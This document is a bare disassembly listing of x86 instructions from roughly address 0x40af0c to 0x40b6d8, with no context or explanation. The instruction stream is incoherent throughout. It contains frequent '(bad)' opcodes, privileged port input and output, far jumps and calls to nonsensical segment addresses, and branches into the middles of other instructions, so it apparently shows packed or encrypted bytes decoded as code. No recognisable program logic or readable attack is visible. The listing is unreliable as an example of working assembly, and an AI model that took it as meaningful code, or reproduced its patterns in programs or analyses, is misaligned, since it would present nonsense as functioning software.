  40af0c:	add    cl,BYTE PTR [edx]
  40af0e:	mov    ecx,0x5395faf8
  40af13:	aam    0x2f
  40af15:	fs pop ebp
  40af17:	out    0xf9,eax
  40af19:	cmp    DWORD PTR [eax+0x5b],0x77782acf
  40af20:	push   edi
  40af21:	sub    BYTE PTR [eax-0x475906c9],ah
  40af27:	popf   
  40af28:	stc    
  40af29:	(bad)
  40af2d:	push   ebx
  40af2e:	xor    edx,eax
  40af30:	test   BYTE PTR [ecx],bl
  40af32:	bound  esp,QWORD PTR [eax]
  40af34:	imul   ebp,ebx,0xf1568307
  40af3a:	or     bh,dl
  40af3c:	jecxz  0x40af3e
  40af3e:	ss xchg esi,eax
  40af40:	and    ah,cl
  40af42:	inc    esp
  40af43:	mov    ebp,0x759056e2
  40af48:	push   esp
  40af49:	push   ebp
  40af4a:	lock in al,0xe7
  40af4d:	or     DWORD PTR [esi-0x1534f36d],ebp
  40af53:	test   ch,dl
  40af55:	scas   eax,DWORD PTR es:[edi]
  40af56:	adc    eax,0x5e9c7391
  40af5b:	xchg   ecx,eax
  40af5c:	dec    esi
  40af5d:	call   0x22cb1801
  40af62:	sub    DWORD PTR [ebx-0x60ae07f3],esi
  40af68:	pop    ecx
  40af69:	add    DWORD PTR [ebx-0x19247744],eax
  40af6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af70:	iret   
  40af71:	xor    DWORD PTR [esi-0x33],0x6
  40af75:	pop    ebx
  40af76:	jne    0x40af4a
  40af78:	jne    0x40af83
  40af7a:	mov    edx,0x1d58715f
  40af7f:	stos   DWORD PTR es:[edi],eax
  40af80:	iret   
  40af81:	add    edx,DWORD PTR [esi-0x66b908c8]
  40af87:	shl    BYTE PTR [edx+0x14eeae9f],cl
  40af8d:	jg     0x40af31
  40af8f:	jae    0x40b006
  40af91:	outs   dx,DWORD PTR ds:[esi]
  40af92:	xchg   esp,eax
  40af93:	in     al,dx
  40af94:	aam    0x7e
  40af96:	idiv   DWORD PTR [eax+0x20]
  40af99:	scas   eax,DWORD PTR es:[edi]
  40af9a:	pusha  
  40af9b:	dec    ecx
  40af9c:	mov    esp,DWORD PTR [bx+0x2c]
  40afa0:	mov    cl,0x15
  40afa2:	outs   dx,BYTE PTR ds:[esi]
  40afa3:	mov    ds,WORD PTR [esp+ebx*4-0x7]
  40afa7:	idiv   dl
  40afa9:	je     0x40af95
  40afab:	cwde   
  40afac:	lea    edx,[ebx+0x3e4a4d03]
  40afb2:	xor    al,0x1d
  40afb4:	imul   ecx,DWORD PTR [ebx+0x79],0x25f36f9f
  40afbb:	adc    BYTE PTR [eax-0x3c],bl
  40afbe:	je     0x40b02e
  40afc0:	addr16 push esp
  40afc2:	imul   ecx,DWORD PTR [ecx+ebx*8],0x3a
  40afc6:	mov    edi,0xaf94434a
  40afcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40afcc:	mov    eax,0x295b1102
  40afd1:	into   
  40afd2:	popf   
  40afd3:	(bad)  
  40afd4:	dec    ecx
  40afd5:	bound  ecx,QWORD PTR [edx]
  40afd7:	dec    ebx
  40afd8:	lods   al,BYTE PTR ds:[esi]
  40afd9:	aam    0x73
  40afdb:	les    esi,FWORD PTR [esi]
  40afdd:	popf   
  40afde:	imul   ebp,edx,0x18
  40afe1:	sbb    al,0xd4
  40afe3:	(bad)  
  40afe4:	(bad)  
  40afe5:	cld    
  40afe6:	(bad)  
  40afe7:	les    ebp,FWORD PTR [esi]
  40afe9:	sub    eax,DWORD PTR [ebx+0x21e4d321]
  40afef:	adc    al,BYTE PTR [edi+0xfb96a9c]
  40aff5:	push   eax
  40aff6:	xor    ebp,DWORD PTR [esi+0x6e604989]
  40affc:	retf   0x2563
  40afff:	pop    ds
  40b000:	inc    ebx
  40b001:	mov    BYTE PTR [ecx-0x50ecb038],dl
  40b007:	fcmovnbe st,st(5)
  40b009:	das    
  40b00a:	push   ebx
  40b00b:	push   esp
  40b00c:	in     eax,0x1e
  40b00e:	test   dh,dh
  40b010:	js     0x40b039
  40b012:	cmp    BYTE PTR [edx+0x823a01d],0x49
  40b019:	adc    DWORD PTR [edi+0x55],esp
  40b01c:	pop    esi
  40b01d:	outs   dx,DWORD PTR ds:[esi]
  40b01e:	(bad)  
  40b01f:	ss or  ch,cl
  40b022:	jmp    0xdf90:0x4d33199c
  40b029:	pop    edi
  40b02a:	jne    0x40afb7
  40b02c:	inc    eax
  40b02d:	xor    BYTE PTR [ebp-0x4f],0xe2
  40b031:	(bad)
  40b036:	sub    BYTE PTR [edx+0x26],ch
  40b039:	push   es
  40b03a:	jns    0x40aff3
  40b03c:	cwde   
  40b03d:	and    DWORD PTR [edi-0x280ced74],ebx
  40b043:	shl    bl,0x4e
  40b046:	ret    0xd36e
  40b049:	jae    0x40b02d
  40b04b:	jo     0x40afdb
  40b04d:	sahf   
  40b04e:	call   0xf3384bc
  40b053:	adc    eax,0xebdc3b65
  40b058:	jp     0x40b06a
  40b05a:	push   cs
  40b05b:	pop    es
  40b05c:	push   cs
  40b05d:	retf   
  40b05e:	call   FWORD PTR [ecx-0x7d4b20b5]
  40b064:	push   ecx
  40b065:	mov    ds:0x24334808,al
  40b06a:	or     eax,0x72e0ebff
  40b06f:	add    ah,cl
  40b071:	ins    DWORD PTR es:[edi],dx
  40b072:	jg     0x40b02b
  40b074:	sbb    al,0x80
  40b076:	pop    ebp
  40b077:	cmp    esp,DWORD PTR [esi-0x1e657c22]
  40b07d:	(bad)  
  40b07e:	in     eax,0x56
  40b080:	sub    DWORD PTR [eax+0x6a3351ec],0x7a
  40b087:	call   DWORD PTR [edi+ebp*2+0x3d]
  40b08b:	retf   0x7db1
  40b08e:	retf   0x5e8c
  40b091:	ds xchg esp,eax
  40b093:	jo     0x40b0cf
  40b095:	lock sbb al,0x2e
  40b098:	or     esp,DWORD PTR [esi+0x26da5abc]
  40b09e:	cli    
  40b09f:	stc    
  40b0a0:	test   cl,dl
  40b0a2:	sub    eax,0xfed93a55
  40b0a7:	jne    0xe5d1180b
  40b0ad:	push   ebp
  40b0ae:	xor    BYTE PTR [edi*4-0x25052158],bh
  40b0b5:	xchg   ecx,eax
  40b0b6:	cld    
  40b0b7:	jle    0x40b061
  40b0b9:	ret    
  40b0ba:	(bad)  [ecx]
  40b0bc:	xchg   esi,eax
  40b0bd:	pushf  
  40b0be:	in     al,dx
  40b0bf:	cmc    
  40b0c0:	stc    
  40b0c1:	pop    edx
  40b0c2:	in     al,dx
  40b0c3:	and    ebx,DWORD PTR [ebp-0x29d44df7]
  40b0c9:	mov    ax,0x9537
  40b0cd:	pop    ebp
  40b0ce:	push   cs
  40b0cf:	push   cs
  40b0d0:	xchg   ebp,eax
  40b0d1:	mov    al,0x9d
  40b0d3:	dec    esp
  40b0d4:	xor    eax,DWORD PTR [eax+esi*2-0x1]
  40b0d8:	(bad)  
  40b0d9:	sbb    cl,BYTE PTR [eax]
  40b0db:	or     DWORD PTR [eax-0x714ca7d3],edx
  40b0e1:	aas    
  40b0e2:	mov    BYTE PTR [ecx-0x316854b9],al
  40b0e8:	push   ds
  40b0e9:	cmp    BYTE PTR [eax+0x2af72665],0xcb
  40b0f0:	loope  0x40b075
  40b0f2:	inc    eax
  40b0f3:	or     al,0xbf
  40b0f5:	push   eax
  40b0f6:	adc    eax,0x82aacccf
  40b0fb:	shld   DWORD PTR [esi+0x33],ecx,0xf8
  40b100:	add    BYTE PTR [edi-0x24548d59],dh
  40b106:	nop
  40b107:	add    eax,0x18733488
  40b10c:	inc    ebp
  40b10d:	test   bh,dh
  40b10f:	loopne 0x40b107
  40b111:	sub    ebx,DWORD PTR [eax-0x6f]
  40b114:	in     al,dx
  40b115:	push   ds
  40b116:	(bad)  
  40b117:	repnz fistp QWORD PTR [eax+0x65]
  40b11b:	iret   
  40b11c:	scas   al,BYTE PTR es:[edi]
  40b11d:	aam    0xf
  40b11f:	imul   esi,ebp,0x8c0499c5
  40b125:	aad    0x38
  40b127:	pop    esi
  40b128:	loope  0x40b181
  40b12a:	xor    BYTE PTR [ebx],0xa6
  40b12d:	test   DWORD PTR [ecx-0x5b],esi
  40b130:	dec    ebp
  40b131:	retf   
  40b132:	jmp    0xf810:0x494d259f
  40b139:	popa   
  40b13a:	je     0x40b0d3
  40b13c:	aas    
  40b13d:	xor    ah,BYTE PTR [edi-0x75]
  40b140:	popa   
  40b141:	mov    edi,ebx
  40b143:	arpl   WORD PTR [edx-0x7b1f1cef],sp
  40b149:	xor    eax,0x1162b8c1
  40b14e:	push   ebp
  40b14f:	push   ebp
  40b150:	push   esi
  40b151:	shl    BYTE PTR [edx-0x53],0x5
  40b155:	(bad)  [ecx+0x70eafd7f]
  40b15b:	mov    bh,0xa9
  40b15d:	or     ebx,DWORD PTR [ebp+0x76994c30]
  40b163:	(bad)  
  40b164:	xchg   edi,eax
  40b165:	fdivr  st,st(3)
  40b167:	pop    ecx
  40b168:	in     al,dx
  40b169:	test   al,0xf0
  40b16b:	(bad)  
  40b16c:	mov    ah,0x5d
  40b16e:	call   0xfb617c6c
  40b173:	ret    
  40b174:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b175:	pushf  
  40b176:	jb     0x40b13f
  40b178:	mov    cs,WORD PTR [edi-0x3f]
  40b17b:	jge    0x40b13c
  40b17d:	mov    al,0x4c
  40b17f:	sub    esp,DWORD PTR [edi+0x5e3e4ff1]
  40b185:	mov    edx,0x7604a1e9
  40b18a:	pop    es
  40b18b:	push   0xffffffeb
  40b18d:	mov    ecx,0x8d697178
  40b192:	daa    
  40b193:	in     al,0xdb
  40b195:	push   ecx
  40b196:	xlat   BYTE PTR ds:[ebx]
  40b197:	jae    0x40b19d
  40b199:	mov    edx,DWORD PTR ds:0x2c31d2b4
  40b19f:	mov    al,ds:0x15994e05
  40b1a4:	pop    esi
  40b1a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1a6:	push   0x80d35b7b
  40b1ab:	sbb    eax,DWORD PTR [edx-0x6c9b2092]
  40b1b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1b2:	jns    0x40b1a1
  40b1b4:	jb     0x40b1ad
  40b1b6:	cmp    ch,0x4d
  40b1b9:	and    edx,DWORD PTR [edi+0x3b587dc4]
  40b1bf:	idiv   BYTE PTR [edx+edx*8]
  40b1c2:	mov    ds:0x42220688,al
  40b1c7:	jbe    0x40b192
  40b1c9:	xor    ah,BYTE PTR ds:0x918904ca
  40b1cf:	mov    ecx,0xfda8f7d6
  40b1d4:	and    BYTE PTR [ebx],al
  40b1d6:	or     dl,BYTE PTR [ebx+0x2ca08938]
  40b1dc:	xor    DWORD PTR [esi+eax*2],edx
  40b1df:	lods   eax,DWORD PTR ds:[esi]
  40b1e0:	dec    edi
  40b1e1:	jbe    0x40b228
  40b1e3:	mov    eax,0x38abdeac
  40b1e8:	pop    fs
  40b1ea:	fiadd  DWORD PTR [ebx]
  40b1ec:	and    BYTE PTR [ebp+0x5d259f54],dh
  40b1f2:	xor    eax,0xe8342209
  40b1f7:	mov    ebx,edx
  40b1f9:	nop    esp
  40b1fc:	mov    bx,0x4f12
  40b200:	loopne 0x40b19a
  40b202:	sar    bh,1
  40b204:	or     eax,0xc6cf3a4f
  40b209:	arpl   ax,ax
  40b20b:	sbb    DWORD PTR [edi+ecx*4-0x30e52555],eax
  40b212:	mov    ds:0x388071c7,eax
  40b217:	in     eax,0xb4
  40b219:	cmp    DWORD PTR [eax],ebp
  40b21b:	int    0xbe
  40b21d:	push   edi
  40b21e:	scas   eax,DWORD PTR es:[edi]
  40b21f:	outs   dx,BYTE PTR ds:[esi]
  40b220:	daa    
  40b221:	cmc    
  40b222:	sub    eax,0x6b6f290e
  40b227:	out    0x0,eax
  40b229:	in     eax,0x84
  40b22b:	adc    al,0x4
  40b22d:	jae    0x40b1ff
  40b22f:	and    DWORD PTR [ecx],edx
  40b231:	mov    DWORD PTR [edi+0x43840953],edi
  40b237:	and    bh,0x3d
  40b23a:	dec    esp
  40b23b:	and    ebp,DWORD PTR [esi+ecx*4-0x52]
  40b23f:	xor    eax,0x6d8f1e8a
  40b244:	ret    0xd9d8
  40b247:	out    0x73,al
  40b249:	sub    eax,0x8cc22da3
  40b24e:	jmp    0x713b7f43
  40b253:	xor    DWORD PTR [esi+0x65d1810],0x63e4f86a
  40b25d:	inc    ebp
  40b25e:	push   cs
  40b25f:	repnz mov ch,bl
  40b262:	add    ch,BYTE PTR [esi]
  40b264:	hlt    
  40b265:	stos   DWORD PTR es:[edi],eax
  40b266:	adc    ebp,DWORD PTR [edx+0x79e00211]
  40b26c:	retf   0xfdde
  40b26f:	cmp    eax,0x50ea87f1
  40b274:	push   0xb86229ee
  40b279:	jo     0x40b246
  40b27b:	cmp    eax,0xc74fc2e4
  40b280:	xor    esp,DWORD PTR [edi+0x1051e578]
  40b286:	sub    al,0xf
  40b288:	xchg   ebp,eax
  40b289:	mov    ebp,0x535e90fa
  40b28e:	mov    edi,0xae2d10e3
  40b293:	pop    esi
  40b294:	mov    eax,0x8c094d29
  40b299:	cdq    
  40b29a:	(bad)  
  40b29b:	icebp  
  40b29c:	das    
  40b29d:	sbb    dh,ah
  40b29f:	or     ebp,DWORD PTR [ebx+eax*4]
  40b2a2:	cs xor eax,0x98abccf9
  40b2a8:	daa    
  40b2a9:	div    BYTE PTR [ebx+eax*8+0x21]
  40b2ad:	dec    ecx
  40b2ae:	mov    DWORD PTR [edi+ebx*1+0x2a29d599],esp
  40b2b5:	out    0x22,al
  40b2b7:	add    al,0x46
  40b2b9:	daa    
  40b2ba:	test   ah,ch
  40b2bc:	mov    eax,ds:0xa362527d
  40b2c1:	(bad)  
  40b2c2:	mov    ecx,0xe10d138e
  40b2c7:	pop    esp
  40b2c8:	cs or  eax,0xe36740b0
  40b2ce:	jnp    0x40b30a
  40b2d0:	mov    al,ds:0xdbcbf64f
  40b2d5:	call   0xa0fd:0x4f74a9ca
  40b2dc:	push   eax
  40b2dd:	or     eax,edx
  40b2df:	or     al,0x21
  40b2e1:	xchg   ebx,edi
  40b2e3:	jg     0x40b363
  40b2e5:	pop    esi
  40b2e6:	ins    BYTE PTR es:[edi],dx
  40b2e7:	cmp    eax,0x7a8bc47c
  40b2ec:	dec    ecx
  40b2ed:	pop    ebp
  40b2ee:	xchg   DWORD PTR [ebp+0x7c],esp
  40b2f1:	add    DWORD PTR [esi+0x592b1694],0xfffffff2
  40b2f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b2f9:	push   cs
  40b2fa:	fucom  st(5)
  40b2fc:	fldcw  WORD PTR [edi-0x56]
  40b2ff:	pop    es
  40b300:	adc    eax,DWORD PTR [ecx-0x67b7dd52]
  40b306:	call   0x452c79a9
  40b30b:	hlt    
  40b30c:	adc    BYTE PTR [ebx+0x41cd0314],dh
  40b312:	lods   eax,DWORD PTR ds:[esi]
  40b313:	fsub   DWORD PTR [eax+0x5c]
  40b316:	pusha  
  40b317:	(bad)  
  40b318:	mov    DWORD PTR [esi+0xb],ebp
  40b31b:	sbb    al,0xb3
  40b31d:	cmp    eax,DWORD PTR [ebx+0x18]
  40b320:	or     dh,BYTE PTR [ebp-0x60b83d8b]
  40b326:	mov    ebx,ds
  40b328:	inc    ebx
  40b329:	fstp   DWORD PTR ds:0x4ff6493b
  40b32f:	cmp    BYTE PTR [edx+0x79],ah
  40b332:	in     eax,0x26
  40b334:	call   0x425a:0x3d6a1f0
  40b33b:	sbb    al,BYTE PTR ds:0xc01deb6e
  40b341:	xchg   esi,eax
  40b342:	jns    0x40b354
  40b344:	icebp  
  40b345:	stos   DWORD PTR es:[edi],eax
  40b346:	rcr    DWORD PTR ds:0xd0dd5d05,0x64
  40b34d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b34e:	mov    cl,0x45
  40b350:	mov    ebx,DWORD PTR [esp+eax*1-0x66]
  40b354:	mov    cl,0x42
  40b356:	dec    eax
  40b357:	push   ss
  40b358:	cmp    al,0x2b
  40b35a:	in     eax,0xd6
  40b35c:	mov    ebp,0xab6a9e28
  40b361:	leave  
  40b362:	xor    al,0x63
  40b364:	jbe    0x40b3d7
  40b366:	xor    eax,DWORD PTR [edx+eax*1]
  40b369:	je     0x40b3b6
  40b36b:	fstp   QWORD PTR [eax+edx*2+0x21]
  40b36f:	inc    edi
  40b370:	ror    edi,1
  40b372:	mov    dh,cl
  40b374:	into   
  40b375:	jb     0x40b38e
  40b377:	lds    eax,FWORD PTR [ebx-0x14]
  40b37a:	cld    
  40b37b:	adc    edx,DWORD PTR [eax+0x2c57a5c6]
  40b381:	into   
  40b382:	mov    esp,0x49ee82f3
  40b387:	sub    al,0xaa
  40b389:	shl    ecx,0x63
  40b38c:	ret    0x9b62
  40b38f:	dec    ebp
  40b390:	aas    
  40b391:	pop    es
  40b392:	sbb    cl,BYTE PTR [ebx+0x1939094a]
  40b398:	(bad)  
  40b399:	sub    ecx,DWORD PTR [ebp+0x38]
  40b39c:	push   es
  40b39d:	int3   
  40b39e:	xor    eax,DWORD PTR [ebx-0x1bc7d431]
  40b3a4:	in     eax,dx
  40b3a5:	xor    al,0x44
  40b3a7:	sub    eax,0x46d4e1d3
  40b3ac:	xchg   ebp,eax
  40b3ad:	cmc    
  40b3ae:	dec    eax
  40b3af:	jne    0x40b3f6
  40b3b1:	popa   
  40b3b2:	cmp    BYTE PTR [edi],0x47
  40b3b5:	cmc    
  40b3b6:	leave  
  40b3b7:	jle    0x40b431
  40b3b9:	enter  0x7c65,0xa1
  40b3bd:	sbb    bl,BYTE PTR [ebx-0x27eafde9]
  40b3c3:	mov    bl,0x27
  40b3c5:	adc    DWORD PTR [edi],0xffffff81
  40b3c8:	je     0x40b42f
  40b3ca:	add    al,BYTE PTR [esi+esi*8]
  40b3cd:	call   0xc9638b23
  40b3d2:	inc    ebx
  40b3d3:	or     dl,BYTE PTR [edi-0x19]
  40b3d6:	fadd   st(7),st
  40b3d8:	loop   0x40b413
  40b3da:	in     eax,0x13
  40b3dc:	push   ecx
  40b3dd:	mov    dh,BYTE PTR [ecx+0x34b2f3e]
  40b3e3:	inc    edi
  40b3e4:	jbe    0x40b41f
  40b3e6:	mov    ch,0xe4
  40b3e8:	sahf   
  40b3e9:	cmp    BYTE PTR [esi-0x7a],bl
  40b3ec:	xor    ch,ch
  40b3ee:	xchg   edi,eax
  40b3ef:	pop    ds
  40b3f0:	outs   dx,DWORD PTR ds:[esi]
  40b3f1:	push   ebp
  40b3f2:	and    DWORD PTR [eax],eax
  40b3f4:	inc    esi
  40b3f5:	jb     0x40b41d
  40b3f7:	fs aaa 
  40b3f9:	add    BYTE PTR [ecx],dl
  40b3fb:	out    dx,eax
  40b3fc:	imul   ebx,DWORD PTR [edi-0x3052af1e],0xd
  40b403:	mov    cl,0x70
  40b405:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b406:	out    dx,al
  40b407:	jbe    0x40b483
  40b409:	test   DWORD PTR [edi+0x595de76],esp
  40b40f:	in     al,0x85
  40b411:	test   eax,0x7b01171
  40b416:	dec    edi
  40b417:	enter  0xd44d,0xff
  40b41b:	fild   QWORD PTR [ecx+0x18ac8f15]
  40b421:	mov    fs,edi
  40b423:	mov    ecx,0x89bd3f29
  40b428:	mov    ebp,0x3be7f721
  40b42d:	mov    ah,BYTE PTR [esi+0x39bf10f9]
  40b433:	mov    ebx,0x2fc5c392
  40b438:	repnz fwait
  40b43a:	loop   0x40b469
  40b43c:	cld    
  40b43d:	lea    ebx,[esi+0x1000fa29]
  40b443:	js     0x40b3e4
  40b445:	es ret 
  40b447:	pop    esi
  40b448:	test   DWORD PTR [edx+esi*8],0xebb14604
  40b44f:	xor    ecx,edx
  40b451:	push   0xed26d06e
  40b456:	pop    edi
  40b457:	push   0xbffe222
  40b45c:	jne    0x40b495
  40b45e:	pop    ebx
  40b45f:	inc    ebx
  40b460:	ins    DWORD PTR es:[edi],dx
  40b461:	call   0xad66:0x9e48d5b7
  40b468:	sti    
  40b469:	xlat   BYTE PTR ds:[ebx]
  40b46a:	add    eax,0x43850425
  40b46f:	scas   al,BYTE PTR es:[edi]
  40b470:	test   al,0x18
  40b472:	dec    esi
  40b473:	dec    edi
  40b474:	cs scas eax,DWORD PTR es:[edi]
  40b476:	fisubr DWORD PTR [ebp+0xc]
  40b479:	sbb    BYTE PTR [ebx],bl
  40b47b:	pop    esp
  40b47c:	call   esi
  40b47e:	fcomp  DWORD PTR [esi+0x2]
  40b481:	mov    bh,0xaf
  40b483:	push   edi
  40b484:	sbb    al,bh
  40b486:	push   0xffffffe6
  40b488:	push   esp
  40b489:	mov    ecx,0xe394faca
  40b48e:	stc    
  40b48f:	ins    DWORD PTR es:[edi],dx
  40b490:	adc    ebp,esp
  40b492:	std    
  40b493:	or     ebx,DWORD PTR [eax+0x188dfee1]
  40b499:	mov    ah,0x45
  40b49b:	shr    DWORD PTR [ebx-0x48],cl
  40b49e:	mov    BYTE PTR [ebx],bl
  40b4a0:	mov    ebp,0x5c066766
  40b4a5:	push   esp
  40b4a6:	push   edi
  40b4a7:	fcmovnbe st,st(0)
  40b4a9:	push   0x67c489a8
  40b4ae:	int    0xb8
  40b4b0:	bound  ecx,QWORD PTR [ebx+0x6a]
  40b4b3:	xchg   edi,eax
  40b4b4:	dec    ecx
  40b4b5:	adc    eax,0x5c62a3c2
  40b4ba:	out    0x24,al
  40b4bc:	or     cl,BYTE PTR [esi-0x32]
  40b4bf:	xchg   edx,eax
  40b4c0:	loop   0x40b493
  40b4c2:	jo     0x40b4ad
  40b4c4:	cmc    
  40b4c5:	sbb    BYTE PTR [ecx-0x4d9d079],bh
  40b4cb:	sbb    bh,BYTE PTR [edx]
  40b4cd:	dec    ecx
  40b4ce:	ss aad 0x1f
  40b4d1:	adc    DWORD PTR [eax+esi*8],edx
  40b4d4:	dec    ebx
  40b4d5:	shl    BYTE PTR [eax-0xd],1
  40b4d8:	mov    eax,ds:0x32ae3a84
  40b4dd:	mov    al,0x38
  40b4df:	jl     0x40b47a
  40b4e1:	sub    eax,0xc7dfd07e
  40b4e6:	fcmovb st,st(3)
  40b4e8:	rcr    BYTE PTR [eax+0x30ea9aa4],1
  40b4ee:	pop    edx
  40b4ef:	jae    0x40b511
  40b4f1:	mov    DWORD PTR ds:0x6c4c39fe,eax
  40b4f7:	(bad)  [ecx-0x27cfed81]
  40b4fd:	dec    ebp
  40b4fe:	adc    eax,0x7cf96184
  40b503:	add    al,0x3a
  40b505:	addr16 jne 0x40b524
  40b508:	scas   eax,DWORD PTR es:[edi]
  40b509:	xchg   BYTE PTR [ebx+0x63],dl
  40b50c:	hlt    
  40b50d:	fcomp  QWORD PTR [esi+0x31dd39b8]
  40b513:	lods   al,BYTE PTR ds:[esi]
  40b514:	mov    cl,0xfc
  40b516:	fwait
  40b517:	in     al,0x39
  40b519:	dec    ebp
  40b51a:	pop    ss
  40b51b:	pop    es
  40b51c:	mov    ch,0x39
  40b51e:	push   edx
  40b51f:	cmp    BYTE PTR [ebx-0x71],0xf1
  40b523:	inc    edx
  40b524:	sahf   
  40b525:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b526:	ds out dx,al
  40b528:	xor    edx,eax
  40b52a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b52b:	sub    eax,0xa0b576f0
  40b530:	sahf   
  40b531:	lahf   
  40b532:	xchg   esi,eax
  40b533:	int3   
  40b534:	or     BYTE PTR [ebx+0x8f75ef0],dh
  40b53a:	pusha  
  40b53b:	mov    ebp,0xbe454fda
  40b540:	hlt    
  40b541:	aas    
  40b542:	fst    QWORD PTR [edx]
  40b544:	daa    
  40b545:	adc    DWORD PTR [edx-0x41b2bd60],0x5f4ee28b
  40b54f:	or     al,0xb7
  40b551:	aas    
  40b552:	imul   ebx,DWORD PTR [edx+0x5b6fe502],0xc3f81e05
  40b55c:	adc    DWORD PTR [ebx],ecx
  40b55e:	mov    bh,BYTE PTR [ecx]
  40b560:	push   ds
  40b561:	and    al,cl
  40b563:	jno    0x40b577
  40b565:	dec    esp
  40b566:	inc    ebx
  40b567:	push   edi
  40b568:	mov    ecx,0xf7b0d962
  40b56d:	sti    
  40b56e:	push   ds
  40b56f:	sar    BYTE PTR [eax+0x44],1
  40b572:	ret    0xe308
  40b575:	es pop edi
  40b577:	lds    edi,FWORD PTR [esi-0x6bb6ddd1]
  40b57d:	xchg   esi,eax
  40b57e:	or     DWORD PTR [eax+eax*8],0x76451188
  40b585:	jo     0x40b5e2
  40b587:	dec    ebp
  40b588:	mov    eax,DWORD PTR [esp+esi*2-0x6b66261b]
  40b58f:	enter  0x11bf,0xee
  40b593:	adc    al,ah
  40b595:	ss scas al,BYTE PTR es:[edi]
  40b597:	or     ch,ah
  40b599:	scas   al,BYTE PTR es:[edi]
  40b59a:	sahf   
  40b59b:	dec    edx
  40b59c:	retf   
  40b59d:	les    edi,FWORD PTR [eax]
  40b59f:	push   eax
  40b5a0:	jecxz  0x40b5ad
  40b5a2:	cdq    
  40b5a3:	push   ebp
  40b5a4:	pop    ds
  40b5a5:	in     eax,dx
  40b5a6:	sbb    edx,DWORD PTR [edx+0x4311562e]
  40b5ac:	mov    esp,0x4dda7abf
  40b5b1:	push   ecx
  40b5b2:	mov    al,0x66
  40b5b4:	out    0xb5,al
  40b5b6:	push   ds
  40b5b7:	push   ds
  40b5b8:	outs   dx,BYTE PTR ds:[esi]
  40b5b9:	pop    eax
  40b5ba:	lahf   
  40b5bb:	lock dec esp
  40b5bd:	pop    edi
  40b5be:	or     cl,bl
  40b5c0:	fimul  DWORD PTR [ebx-0x67]
  40b5c3:	mov    bh,0xfe
  40b5c5:	push   eax
  40b5c6:	and    bh,cl
  40b5c8:	inc    ecx
  40b5c9:	in     eax,dx
  40b5ca:	aam    0x75
  40b5cc:	sub    al,bl
  40b5ce:	sbb    DWORD PTR [ecx],0xffffff9d
  40b5d1:	push   esp
  40b5d2:	sti    
  40b5d3:	retf   0x7656
  40b5d6:	shr    DWORD PTR ds:0x9199eb2b,0x1f
  40b5dd:	packuswb mm3,QWORD PTR [ebx+0x57]
  40b5e1:	mov    bh,0x1d
  40b5e3:	cdq    
  40b5e4:	jne    0x40b5c9
  40b5e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5e7:	sbb    DWORD PTR [ecx+eiz*8],ecx
  40b5ea:	int    0x96
  40b5ec:	push   ss
  40b5ed:	inc    ebp
  40b5ee:	and    al,0x8c
  40b5f0:	push   esi
  40b5f1:	mov    esi,0x5351b4e8
  40b5f6:	add    eax,0x33c5ea8a
  40b5fb:	push   ss
  40b5fc:	rcl    BYTE PTR [ebp+edx*2+0x52],0x11
  40b601:	adc    DWORD PTR [edi-0x8dc4dd4],0xe2b089c4
  40b60b:	or     eax,0x5bc6a9ea
  40b610:	add    BYTE PTR [eax+edi*4-0x18],0xed
  40b615:	or     ebp,edi
  40b617:	sub    ebp,edi
  40b619:	dec    ebp
  40b61a:	adc    DWORD PTR [ecx],eax
  40b61c:	fnstenv [ecx]
  40b61e:	inc    esp
  40b61f:	test   BYTE PTR ss:[edx+eiz*1-0x4ce9479d],dh
  40b627:	sbb    al,0xc4
  40b629:	int    0xfe
  40b62b:	neg    DWORD PTR ss:[ebx]
  40b62e:	imul   esi,DWORD PTR [esi-0x37169c2d],0x477d28d0
  40b638:	iret   
  40b639:	inc    esi
  40b63a:	mov    eax,0xeba9d17e
  40b63f:	lods   al,BYTE PTR ds:[esi]
  40b640:	fistp  DWORD PTR ss:[ecx-0x6eb3dc62]
  40b647:	mov    cl,0xe1
  40b649:	lds    edx,FWORD PTR [esi-0x3b]
  40b64c:	data16 or al,0x51
  40b64f:	or     al,0x22
  40b651:	xor    eax,0x768a04ec
  40b656:	arpl   WORD PTR [ebp+0xf],bx
  40b659:	jle    0x40b69e
  40b65b:	outs   dx,BYTE PTR ds:[esi]
  40b65c:	add    BYTE PTR [edx-0x7a28b96f],0xfa
  40b663:	jae    0x40b5e6
  40b665:	sub    cl,BYTE PTR [ebx-0x37c276d2]
  40b66b:	popa   
  40b66c:	fist   DWORD PTR [edi-0x4e]
  40b66f:	add    dh,bh
  40b671:	jbe    0x40b63b
  40b673:	jne    0x40b66f
  40b675:	(bad)  
  40b677:	jmp    0x26cb:0xff282ea1
  40b67e:	sub    dh,BYTE PTR [edx-0x46]
  40b681:	jecxz  0x40b6f2
  40b683:	add    esp,DWORD PTR [ebx+0x55]
  40b686:	je     0x40b627
  40b688:	jmp    0x16c57417
  40b68d:	data16 sub dh,BYTE PTR [ecx]
  40b690:	or     eax,0x13ff9813
  40b695:	test   eax,0x21485188
  40b69a:	dec    edx
  40b69b:	push   ebp
  40b69c:	mov    ebp,0xebe67f0d
  40b6a1:	push   ebx
  40b6a2:	ins    DWORD PTR es:[edi],dx
  40b6a3:	sbb    bl,BYTE PTR [edi+ecx*2-0x64]
  40b6a7:	or     al,0x91
  40b6a9:	xor    BYTE PTR [edi-0x390298e5],ch
  40b6af:	inc    ecx
  40b6b0:	mov    esi,0x4c7418f2
  40b6b5:	add    BYTE PTR ds:[ecx-0x1a],bh
  40b6b9:	(bad)  
  40b6bb:	sub    al,0x7c
  40b6bd:	push   ss
  40b6be:	je     0x40b647
  40b6c0:	cld    
  40b6c1:	ror    BYTE PTR [ebp-0x6a],cl
  40b6c4:	sti    
  40b6c5:	inc    edx
  40b6c6:	mov    ch,0x63
  40b6c8:	std    
  40b6c9:	add    al,0x34
  40b6cb:	and    DWORD PTR [esi+0x5c59bbf0],0x24b94b91
  40b6d5:	sub    bl,BYTE PTR [ebp+0x30]
  40b6d8:	inc    edx
